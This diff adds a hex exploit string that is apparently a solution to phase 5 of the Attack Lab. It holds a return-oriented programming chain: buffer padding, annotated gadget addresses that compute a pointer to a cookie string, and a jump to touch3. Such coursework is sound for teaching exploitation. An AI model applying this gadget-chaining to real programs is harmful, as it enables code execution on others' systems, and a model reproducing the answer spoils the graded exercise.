@@ -1,0 +1,14 @@
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 /* 24 bit buffer */
+8B 1B 40 00 00 00 00 00 /* movq %rsp, %rax */
+3F 1B 40 00 00 00 00 00 /* movq %rax, %rdi */
+46 1B 40 00 00 00 00 00 /* popq %rax */
+48 00 00 00 00 00 00 00 /* 48 bit offset (points to cookie) */
+99 1B 40 00 00 00 00 00 /* movl %eax, %edx */
+EA 1B 40 00 00 00 00 00 /* movl %edx, %ecx */
+A8 1B 40 00 00 00 00 00 /* movl %ecx, %esi */
+5d 1B 40 00 00 00 00 00 /* lea (%rdi, %rsi, 1), %rax */
+3F 1B 40 00 00 00 00 00 /* movq %rax, %rdi */
+85 1A 40 00 00 00 00 00 /* address of touch3 */
+33 65 35 32 64 66 66 35 /* cookie address as string */
